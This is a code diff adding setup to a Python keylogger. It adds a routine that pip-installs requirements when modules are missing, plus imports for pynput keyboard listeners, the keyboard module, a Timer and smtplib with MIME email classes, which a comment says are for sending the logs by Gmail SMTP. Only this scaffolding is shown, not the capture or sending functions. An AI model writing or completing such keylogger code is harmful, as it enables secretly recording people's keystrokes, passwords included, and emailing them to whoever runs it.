@@ -1,5 +1,49 @@
+##########  Install the requirements  ##########
+
+import subprocess
+import sys
+import importlib
+
+
+def install_requirement():
+    try:
+        subprocess.check_call(
+            [sys.executable, "-m", "pip", "install", "-r", "requirements.txt"]
+        )
+        print("\nRequirements are successfully installed!!!\n")
+    except subprocess.CalledProcessError:
+        print("\nError installing requirements. Please make sure 'pip' is installed.\n")
+
+
+def check_module(module_name):
+    try:
+        importlib.import_module(module_name)
+        return True
+    except ImportError:
+        return False
+
+
+required_modules = ["pynput", "datetime", "smtplib", "threading", "email"]
+
+if all(check_module(module) for module in required_modules):
+    pass
+else:
+    install_requirement()
+
+##########  Main code for the keylogger  ##########
+
 from pynput.keyboard import Key, Listener
 from datetime import time, datetime, date
+
+import keyboard  # for keylogs
+import smtplib  # for sending email using SMTP protocol (gmail)
+
+# Timer is to make a method runs after an `interval` amount of time
+from threading import Timer
+from datetime import datetime
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+
 
 count = 0
 keys = []
